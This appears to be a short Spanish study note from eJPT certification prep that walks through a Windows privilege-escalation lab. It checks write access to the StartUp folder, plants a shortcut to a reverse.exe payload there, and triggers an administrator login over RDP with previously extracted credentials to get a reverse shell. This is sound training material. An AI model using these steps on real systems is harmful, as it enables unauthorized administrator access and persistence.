
- Usando accesschk.exe, tenga en cuenta que el grupo BUILTIN\Users puede escribir archivos en el directorio StartUp:

```
C:\PrivEsc\accesschk.exe /accepteula -d "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"

```
- Usando cscript, ejecute C:\PrivEsc\CreateShortcut.vbs script que debería crear un nuevo acceso directo a su ejecutable reverse.exe en el directorio StartUp:

```
cscript C:\PrivEsc\CreateShortcut.vbs
```

- Inicie un oyente en Kali y luego simule un inicio de sesión de administración usando PDR y las credenciales que extrajo anteriormente:

```
rdesktop -u admin 10.10.94.6
```

- Un shell que se ejecuta como administrador debe conectarse nuevamente a su oyente.

enlace:
[[Local/Ciberseguridad/HACKING/CERTIFICACIONES/EJPT/Preparacion-Ejpt]]
[[Apuntes/Ciberseguridad/HACKING/TECNICAS DE ESCALACION DE PRIVILEGIOS/Windows/Herramientas]]
[[Apuntes/Ciberseguridad/HACKING/TECNICAS DE ESCALACION DE PRIVILEGIOS/Windows/Generate a Reverse Shell Executable]]